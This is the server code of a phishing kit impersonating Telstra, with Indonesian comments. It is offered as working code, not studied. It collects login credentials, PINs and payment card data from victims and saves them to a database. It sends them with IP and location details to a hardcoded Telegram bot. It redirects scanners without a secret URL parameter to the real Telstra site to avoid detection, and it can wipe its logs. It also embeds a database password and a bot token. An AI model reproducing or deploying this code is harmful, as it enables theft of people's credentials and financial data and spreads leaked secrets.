// ==================================================
// XCHENBA SERVER — LENGKAP SEMUA FITUR
// DATABASE: mytelstra
// ==================================================

const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(express.json());

// ==================================================
// KONEKSI DATABASE
// ==================================================
const pool = new Pool({
  connectionString: 'postgresql://mytelstra_user:P8SX0LbkksiDP0MygVT97YpMGCh9nuZS@dpg-davp87psrm7s73cs7290-a.oregon-postgres.render.com/mytelstra',
  ssl: { rejectUnauthorized: false }
});

// ==================================================
// BUAT TABEL JIKA BELUM ADA
// ==================================================
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS pengunjung (
        id SERIAL PRIMARY KEY,
        tipe VARCHAR(20) NOT NULL,
        kategori VARCHAR(50),
        data TEXT NOT NULL,
        ip VARCHAR(100),
        isp TEXT DEFAULT 'Tidak terdeteksi',
        negara VARCHAR(100) DEFAULT 'Tidak terdeteksi',
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    
    await pool.query(`
      CREATE TABLE IF NOT EXISTS pengaturan (
        kunci VARCHAR(50) PRIMARY KEY,
        nilai TEXT NOT NULL,
        diperbarui TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    
    const cek = await pool.query("SELECT * FROM pengaturan WHERE kunci = 'parameter_aktif'");
    if (cek.rows.length === 0) {
      await pool.query(
        "INSERT INTO pengaturan (kunci, nilai) VALUES ('parameter_aktif', '=aktif')"
      );
    }
    
    console.log('✅ Database siap — Semua Fitur Aktif');
  } catch (err) {
    console.error('❌ DB Error:', err.message);
  }
}
initDB();

// ==================================================
// TELEGRAM
// ==================================================
const TG_TOKEN = process.env.TG_TOKEN || '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const TG_CHAT_ID = process.env.TG_CHAT_ID || '7808815199';

async function kirimTelegram(pesan) {
  if (!TG_TOKEN || !TG_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: pesan, parse_mode: 'HTML' })
    });
  } catch (e) { console.log('Telegram:', e.message); }
}

// ==================================================
// DETEKSI ISP & NEGARA
// ==================================================
async function ambilInfoIP(ip) {
  const ipBersih = ip.replace(/^::ffff:/, '');
  try {
    const res = await fetch(`https://ipapi.co/${ipBersih}/json/`, { timeout: 5000 });
    if (!res.ok) throw new Error('Respon tidak OK');
    const data = await res.json();
    return {
      isp: data.org || data.isp || 'Tidak terdeteksi',
      negara: data.country_name || data.country || 'Tidak terdeteksi'
    };
  } catch {
    return { isp: 'Tidak terdeteksi', negara: 'Tidak terdeteksi' };
  }
}

// ==================================================
// AMBIL PARAMETER
// ==================================================
async function ambilParameter() {
  try {
    const res = await pool.query("SELECT nilai FROM pengaturan WHERE kunci = 'parameter_aktif'");
    return res.rows.length > 0 ? res.rows[0].nilai : '=aktif';
  } catch {
    return '=aktif';
  }
}

// ==================================================
// CEK PARAMETER
// ==================================================
async function cekParameter(url) {
  const param = await ambilParameter();
  return url.includes(param);
}

// ==================================================
// API — UBAH PARAMETER
// ==================================================
app.post('/api/atur-parameter', async (req, res) => {
  try {
    const { parameter } = req.body;
    const nilaiBersih = parameter.trim() || '=aktif';
    await pool.query(`
      INSERT INTO pengaturan (kunci, nilai) VALUES ('parameter_aktif', $1)
      ON CONFLICT (kunci) DO UPDATE SET nilai = $1, diperbarui = CURRENT_TIMESTAMP
    `, [nilaiBersih]);
    res.json({ ok: true, parameter: nilaiBersih });
  } catch (e) {
    console.error('Atur parameter error:', e);
    res.status(500).json({ ok: false });
  }
});

// ==================================================
// API — RESET / HAPUS SEMUA LOG ✅
// ==================================================
app.post('/api/reset-log', async (req, res) => {
  try {
    await pool.query('DELETE FROM pengunjung');
    await pool.query("ALTER SEQUENCE pengunjung_id_seq RESTART WITH 1");
    res.json({ ok: true, pesan: 'Semua log berhasil dihapus' });
  } catch (e) {
    console.error('Reset error:', e);
    res.status(500).json({ ok: false, pesan: e.message });
  }
});

// ==================================================
// API — AMBIL DATA PANEL
// ==================================================
app.get('/api/data', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM pengunjung ORDER BY id DESC LIMIT 300');
    const paramSekarang = await ambilParameter();
    const ringkasan = {
      human: result.rows.filter(r => r.tipe === 'human' && r.kategori === 'kunjungan').length,
      bot: result.rows.filter(r => r.tipe === 'bot').length,
      login: result.rows.filter(r => r.kategori === 'login').length,
      pin: result.rows.filter(r => r.kategori === 'pin').length,
      kartu: result.rows.filter(r => r.kategori === 'kartu').length,
      parameter: paramSekarang
    };
    res.json({ ringkasan, daftar: result.rows });
  } catch (e) {
    console.error('Data error:', e);
    res.status(500).json({ ok: false });
  }
});

// ==================================================
// API — SIMPAN DATA (HANYA LOGIN/PIN/KARTU KE TELEGRAM)
// ==================================================
app.post('/api/simpan', async (req, res) => {
  try {
    const { jenis, data } = req.body;
    const ipPenuh = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Tidak diketahui';
    const ip = ipPenuh.split(',')[0].trim();
    const infoIP = await ambilInfoIP(ip);

    await pool.query(
      `INSERT INTO pengunjung (tipe, kategori, data, ip, isp, negara, user_agent)
       VALUES ($1, $2, $3, $4, $5, $6, $7)`,
      ['human', jenis, data, ip, infoIP.isp, infoIP.negara, req.headers['user-agent']]
    );

    const kirimKeTelegram = ['login', 'pin', 'kartu'].includes(jenis);
    if (kirimKeTelegram) {
      const pesan = `<b>:: XCHENBA — ${jenis.toUpperCase()} ::</b>\n${data}\n🌍 IP: ${ip}\n📍 ISP: ${infoIP.isp}\n🏳️ Negara: ${infoIP.negara}`;
      await kirimTelegram(pesan);
    }

    res.json({ ok: true });
  } catch (e) {
    console.error('Simpan error:', e);
    res.status(500).json({ ok: false });
  }
});

// ==================================================
// HALAMAN UTAMA — CEK PARAMETER
// ==================================================
app.get('/', async (req, res) => {
  const ipPenuh = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Tidak diketahui';
  const ip = ipPenuh.split(',')[0].trim();
  const isHuman = await cekParameter(req.originalUrl);
  const infoIP = await ambilInfoIP(ip);

  if (!isHuman) {
    await pool.query(
      `INSERT INTO pengunjung (tipe, kategori, data, ip, isp, negara, user_agent)
       VALUES ($1, $2, $3, $4, $5, $6, $7)`,
      ['bot', 'kunjungan', 'Mengakses tanpa parameter', ip, infoIP.isp, infoIP.negara, req.headers['user-agent']]
    );
    return res.redirect('https://www.telstra.com.au/');
  }

  await pool.query(
    `INSERT INTO pengunjung (tipe, kategori, data, ip, isp, negara, user_agent)
     VALUES ($1, $2, $3, $4, $5, $6, $7)`,
    ['human', 'kunjungan', 'Mengakses dengan parameter ✅', ip, infoIP.isp, infoIP.negara, req.headers['user-agent']]
  );

  res.sendFile('index.html', { root: './public' });
});

// ==================================================
// LINDUNGI HALAMAN LAIN
// ==================================================
app.get('/:halaman', async (req, res, next) => {
  const nama = req.params.halaman;
  if (nama === 'panel-rahasia.html' || nama === 'config.js' || nama === 'assets') {
    return next();
  }

  const isHuman = await cekParameter(req.originalUrl);
  if (!isHuman) {
    const ipPenuh = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Tidak diketahui';
    const ip = ipPenuh.split(',')[0].trim();
    const infoIP = await ambilInfoIP(ip);
    await pool.query(
      `INSERT INTO pengunjung (tipe, kategori, data, ip, isp, negara, user_agent)
       VALUES ($1, $2, $3, $4, $5, $6, $7)`,
      ['bot', 'akses', `Mencoba: ${nama}`, ip, infoIP.isp, infoIP.negara, req.headers['user-agent']]
    );
    return res.redirect('https://www.telstra.com.au/');
  }
  next();
});

// ==================================================
// FILE STATIS
// ==================================================
app.use(express.static('public'));

// ==================================================
// JALANKAN
// ==================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('🚀 XCHENBA — Semua Fitur Aktif');
});
